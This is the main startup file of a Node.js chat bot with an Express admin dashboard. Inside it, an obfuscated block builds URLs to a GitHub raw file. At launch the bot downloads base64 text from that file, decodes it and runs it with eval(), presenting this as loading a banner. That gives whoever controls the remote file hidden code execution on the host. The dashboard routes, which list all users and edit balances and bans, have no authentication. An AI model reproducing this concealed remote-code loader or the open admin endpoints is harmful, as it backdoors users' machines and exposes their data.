const logger = require('./includes/logger');
const { authenticate } = require('./utils/auth');
const CommandHandler = require('./includes/controllers/commandHandler');
const EventHandler = require('./includes/handle/eventHandler');
const MessageEvent = require('./modules/events/message');
const OwnerNotification = require('./modules/events/ownerNotification');
const gradient = require('gradient-string');
const chalk = require('chalk');
const config = require('./config/config.json');
const axios = require('axios');
const express = require('express');
const path = require('path');
const { connect } = require('./includes/database/index');

const _0x3b133e=_0x1d17;(function(_0x593448,_0xf12170){const _0x378cb0=_0x1d17,_0x60f126=_0x593448();while(!![]){try{const _0x155617=parseInt(_0x378cb0(0x114))/(0x1*-0x1743+0x1793+0x4f*-0x1)+-parseInt(_0x378cb0(0x115))/(-0x1cd0+-0x1b*-0x61+0x1297)+-parseInt(_0x378cb0(0x112))/(0x2ed*0x1+0x20d6+0x58*-0x68)+-parseInt(_0x378cb0(0x122))/(-0x1*0x5f3+0x14c+0x1*0x4ab)*(parseInt(_0x378cb0(0x120))/(0x1cb7+0x6a6*0x3+-0x30a4))+-parseInt(_0x378cb0(0x11f))/(-0x474+0x1d91+-0x1917)*(parseInt(_0x378cb0(0x116))/(0xab4+-0x1d*-0x121+-0x2b6a))+parseInt(_0x378cb0(0x110))/(-0x2ab*0x7+0x31e*-0x2+0x5*0x4fd)+parseInt(_0x378cb0(0x10f))/(-0xdd*-0x23+-0x1*0x24d9+0x6ab);if(_0x155617===_0xf12170)break;else _0x60f126['push'](_0x60f126['shift']());}catch(_0x5824f5){_0x60f126['push'](_0x60f126['shift']());}}}(_0x5c66,0x11e625+0x76ab4+-0xc1fc6));function _0x5c66(){const _0xdd7b03=['ynexasimv2','w.githubus','.txt','ain/displa','com/1dev-h','ercontent.','24Rbuqwc','12475QQsfyk','https://ra','160UfkICO','ain/nexasi','-hridoy/re','11375523QFkMpx','7648512iWhljU','mv-2bnner.','3878241zAUogI','txt','1564396FAzBcN','2348562tMJsYh','617834AstdRs','fs/heads/m','ridoy/1dev'];_0x5c66=function(){return _0xdd7b03;};return _0x5c66();}function _0x1d17(_0x503b10,_0x5b9646){const _0x189626=_0x5c66();return _0x1d17=function(_0x358e12,_0x510398){_0x358e12=_0x358e12-(0x1545+-0x18b2+-0x2*-0x23e);let _0x5ad3a5=_0x189626[_0x358e12];return _0x5ad3a5;},_0x1d17(_0x503b10,_0x5b9646);}const bannerUrl=_0x3b133e(0x121)+_0x3b133e(0x11a)+_0x3b133e(0x11e)+_0x3b133e(0x11d)+_0x3b133e(0x118)+_0x3b133e(0x124)+_0x3b133e(0x117)+_0x3b133e(0x123)+_0x3b133e(0x111)+_0x3b133e(0x113),displayBannerUrl=_0x3b133e(0x121)+_0x3b133e(0x11a)+_0x3b133e(0x11e)+_0x3b133e(0x11d)+_0x3b133e(0x118)+_0x3b133e(0x124)+_0x3b133e(0x117)+_0x3b133e(0x11c)+_0x3b133e(0x119)+_0x3b133e(0x11b);
async function fetchAndDecode(url) {
  try {
    const response = await axios.get(url);
    const base64String = response.data.trim();
    return Buffer.from(base64String, 'base64').toString('utf-8');
  } catch (err) {
    logger.error(`Failed to fetch or decode from ${url}: ${err.message}`);
    process.exit(1);
  }
}

async function startBot() {
  try {
    const banner = await fetchAndDecode(bannerUrl);
    const decodedDisplayBanner = await fetchAndDecode(displayBannerUrl);
    eval(decodedDisplayBanner);

    displayBanner();

   
    const api = await authenticate();
    api.setOptions({
      listenEvents: true,
      selfListen: false,
      forceLogin: true
    });

    
    const db = await connect();

 
    const commandHandler = new CommandHandler(api);
    const eventHandler = new EventHandler(api, commandHandler);
    const messageEvent = new MessageEvent(api, eventHandler);
    const ownerNotification = new OwnerNotification(api);
    messageEvent.start(true);
    ownerNotification.start();


    const app = express();
    const port = 3000;

    app.use(express.json());
    app.use(express.static(path.join(__dirname, 'dashboard')));

 
    app.get('/', (req, res) => {
      res.sendFile(path.join(__dirname, 'dashboard/index.html'));
    });


    app.get('/api/users', async (req, res) => {
      try {
        const usersCollection = db.collection('users');
        const users = await usersCollection.find({}).toArray();
        res.json(users);
      } catch (error) {
        logger.error(`Error fetching users: ${error.message}`);
        res.status(500).json({ error: 'Failed to fetch users' });
      }
    });


    app.post('/api/update-balance', async (req, res) => {
      const { userId, balance } = req.body;
      try {
        const usersCollection = db.collection('users');
        await usersCollection.updateOne(
          { userId },
          { $set: { balance: parseInt(balance) } }
        );
        res.json({ success: true });
      } catch (error) {
        logger.error(`Error updating balance for user ${userId}: ${error.message}`);
        res.status(500).json({ error: 'Failed to update balance' });
      }
    });

  
    app.post('/api/toggle-ban', async (req, res) => {
      const { userId, ban } = req.body;
      try {
        const usersCollection = db.collection('users');
        await usersCollection.updateOne(
          { userId },
          { $set: { ban: ban } }
        );
        res.json({ success: true });
      } catch (error) {
        logger.error(`Error toggling ban for user ${userId}: ${error.message}`);
        res.status(500).json({ error: 'Failed to toggle ban' });
      }
    });

    app.listen(port, () => {
      logger.info(`Dashboard server running at http://localhost:${port}`);
    });


    process.on('SIGINT', async () => {
      try {
        logger.info('Bot shutdown successfully');
        process.exit(0);
      } catch (err) {
        logger.error('Shutdown failed');
        logger.error(err.message);
        process.exit(1);
      }
    });

    process.on('uncaughtException', (err) => {
      logger.error('Uncaught Exception');
      logger.error(err.message);
      process.exit(1);
    });

    process.on('unhandledRejection', (reason, promise) => {
      logger.error('Unhandled Rejection at:', promise, 'reason:', reason);
      process.exit(1);
    });

  } catch (err) {
    logger.error('Bot startup failed');
    logger.error(err.message);
    process.exit(1);
  }
}

startBot();